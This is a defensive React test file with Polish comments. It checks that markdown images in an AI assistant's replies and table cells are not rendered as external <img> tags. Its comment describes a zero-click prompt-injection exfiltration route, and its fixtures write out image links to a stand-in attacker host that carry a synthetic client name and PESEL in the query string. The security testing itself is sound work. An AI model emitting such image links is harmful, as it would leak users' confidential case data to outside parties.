// A-20: odpowiedz modelu renderowana przez react-markdown (czat AssistantMessage,
// komorka tabular TabularCell) zamienia obraz markdown na <img src="https://...">
// z zewnetrznym hostem - przegladarka/Electron wysyla zadanie GET bez klikniecia,
// wiec prompt injection w dokumencie moze wyeksfiltrowac dane sprawy w query stringu.
// Oczekiwane zachowanie: w DOM nie ma <img> ze zrodlem spoza wlasnego origin
// (obraz zewnetrzny zablokowany lub pokazany jako tekst/link wymagajacy klikniecia).
import { render } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

vi.mock("@/lib/supabase", () => ({
    supabase: {
        auth: {
            getSession: async () => ({ data: { session: null } }),
            onAuthStateChange: () => ({
                data: { subscription: { unsubscribe: () => {} } },
            }),
        },
    },
}));

import { AssistantMessage } from "../src/app/components/assistant/AssistantMessage";
import { TabularCell } from "../src/app/components/tabular/TabularCell";

// Dane syntetyczne: fikcyjny klient + wygenerowany PESEL z poprawna suma kontrolna.
const LEAK = "Jan%20Testowy%2044051401458";

function externalImgs(container: HTMLElement): string[] {
    return Array.from(container.querySelectorAll("img"))
        .map((i) => i.getAttribute("src") ?? "")
        .filter((s) => /^(https?:)?\/\//i.test(s));
}

describe("A-20 - brak zero-click eksfiltracji przez obraz w markdown odpowiedzi modelu", () => {
    it("czat: inline image ![x](https://atakujacy.example/?d=...) nie tworzy <img> z zewnetrznym src", () => {
        const { container } = render(
            <AssistantMessage
                content=""
                events={[{ type: "content", text: `Podsumowanie sprawy.\n\n![logo](https://atakujacy.example/p.png?d=${LEAK})` }]}
            />,
        );
        expect(externalImgs(container)).toEqual([]);
    });

    it("czat: reference-style image ![a][r] + [r]: url tez nie tworzy <img>", () => {
        const { container } = render(
            <AssistantMessage
                content=""
                events={[{ type: "content", text: `Tekst.\n\n![a][r]\n\n[r]: https://atakujacy.example/r.gif?d=${LEAK}` }]}
            />,
        );
        expect(externalImgs(container)).toEqual([]);
    });

    it("czat: protocol-relative //host tez nie tworzy <img>", () => {
        const { container } = render(
            <AssistantMessage
                content=""
                events={[{ type: "content", text: `![a](//atakujacy.example/x.gif?d=${LEAK})` }]}
            />,
        );
        expect(externalImgs(container)).toEqual([]);
    });

    it("tabular: komorka z obrazem markdown nie tworzy <img> z zewnetrznym src", () => {
        const { container } = render(
            <TabularCell
                cell={{
                    id: "c1",
                    review_id: "r1",
                    document_id: "d1",
                    column_index: 0,
                    content: {
                        summary: `Kara umowna. ![x](https://atakujacy.example/t.gif?d=${LEAK})`,
                    },
                    status: "done",
                    created_at: "2026-09-01T00:00:00Z",
                }}
                onExpand={vi.fn()}
            />,
        );
        expect(externalImgs(container)).toEqual([]);
    });
});
